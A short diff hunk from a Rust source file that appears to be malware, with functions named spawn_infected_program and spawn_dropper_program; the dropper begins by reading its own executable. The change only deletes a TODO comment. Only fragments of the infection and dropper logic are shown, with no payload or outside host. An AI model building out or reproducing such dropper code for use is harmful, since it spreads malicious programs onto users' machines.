@@ -107,7 +107,7 @@ pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
     let _child : Child = exec.spawn()?;
     Ok(())
 }
-// IMPLEMENT FROM_RAW_FD FOR ChildStdout, should be a simple implementation from AnonPipe and up.
+
 pub fn spawn_dropper_program() -> Result<(), Box<dyn std::error::Error>> {
     let own_path = current_exe()?;
     let own_contents: Vec<u8> = read(own_path)?;
